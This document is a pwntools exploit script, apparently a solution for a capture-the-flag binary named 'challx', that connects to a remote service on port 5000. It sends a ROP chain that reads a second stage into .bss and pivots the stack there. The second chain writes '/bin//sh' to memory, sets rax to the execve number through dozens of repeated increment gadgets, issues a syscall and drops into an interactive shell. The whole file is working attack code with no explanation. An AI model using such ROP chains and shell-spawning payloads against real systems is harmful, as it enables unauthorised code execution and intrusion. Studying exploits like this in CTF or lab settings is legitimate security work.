from pwn import *
context.log_level = "debug"
context.arch = "amd64"

# r = gdb.debug("./challx", 'break *0x0000000000401857 ')
r = remote("192.168.44.1", 5000)
#r = process("./challx")

elf = ELF("./challx")
rop = ROP(elf)
offset = b"-2" #0x0000000000401857 leave vuln
r.sendline(offset)
rop.raw(0)
rop.rdi = 0
rop.rsi = elf.bss(0x1000)
rop.rdx = 0x1000
rop.raw(elf.sym.read)

print(rop.dump())

payload = rop.chain()
payload += p64(0x00000000004015ea)# : pop rbp ; ret
payload += p64(elf.bss(0x1000))
payload += p64(0x0000000000401857)# : leave ; ret


r.sendline(payload)
r.recv(1, 2)

p = p64(0)
p += p64(0x000000000040e262) # pop rsi ; ret
p += p64(0x00000000004c10c0) # @ .data
p += p64(0x0000000000425c32) # pop rax ; ret
p += b'/bin//sh'
p += p64(0x00000000004275e1) # mov qword ptr [rsi], rax ; ret
p += p64(0x000000000040e262) # pop rsi ; ret
p += p64(0x00000000004c10c8) # @ .data + 8
p += p64(0x0000000000425c32)
p += p64(0)
p += p64(0x00000000004275e1) # mov qword ptr [rsi], rax ; ret
p += p64(0x0000000000402151) # pop rdi ; ret
p += p64(0x00000000004c10c0) # @ .data
p += p64(0x000000000040e262) # pop rsi ; ret
p += p64(0x00000000004c10c8) # @ .data + 8
p += p64(0x0000000000472b77) # pop rdx ; pop rbx ; ret
p += p64(0x00000000004c10c8) # @ .data + 8
p += p64(0x4141414141414141) # padding
p += p64(0x0000000000425c32)
p += p64(0)
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000047dbe0) # add rax, 1 ; ret
p += p64(0x000000000040127e) # syscall

r.sendline(p)
r.interactive()
